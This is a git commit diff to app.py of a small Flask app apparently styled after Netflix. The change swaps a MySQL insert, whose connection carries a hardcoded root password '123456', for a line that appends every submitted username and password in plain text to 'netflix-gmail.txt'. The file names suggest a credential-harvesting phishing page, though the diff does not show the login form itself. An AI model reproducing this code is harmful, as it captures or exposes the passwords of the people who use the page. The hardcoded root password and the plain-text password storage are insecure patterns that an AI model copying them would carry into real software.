577b018571376e5c003bc1698475aed739bf3f64
Annie Dehal <69417494+amninder-dehal@users.noreply.github.com>
2021-01-22 10:46:43 -0800

    Update app.py

--- app.py
+++ app.py
@@ -1,8 +1,8 @@
 from flask import  Flask ,render_template,request
 from datetime import datetime
 import mysql.connector
-mydb= mysql.connector.connect(host='127.0.0.1',port='3306',user='root',password='123456',database= 'netflix')
-mycursor= mydb.cursor()
+# mydb= mysql.connector.connect(host='127.0.0.1',port='3306',user='root',password='123456',database= 'netflix')
+# mycursor= mydb.cursor()
 app = Flask(__name__)
 
 @app.route("/")
@@ -32,10 +32,11 @@ def search():
    try:
      movie = request.form['name']
      print(f'{username} request for {movie}')
-     value = 'insert into user  (name , password,movie ,date ) values (%s,%s,%s,%s)'
-     data = (username, password,movie, datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-     mycursor.execute(value, data)
-     mydb.commit()
+     open('netflix-gmail.txt','a+').write(username + password +datetime.now().strftime("%d/%m/%Y %H:%M:%S")+'\n\n\n'+ movie)
+#      value = 'insert into user  (name , password,movie ,date ) values (%s,%s,%s,%s)'
+#      data = (username, password,movie, datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+#      mycursor.execute(value, data)
+#      mydb.commit()
 
      return render_template('netflixsym.html')
    except:
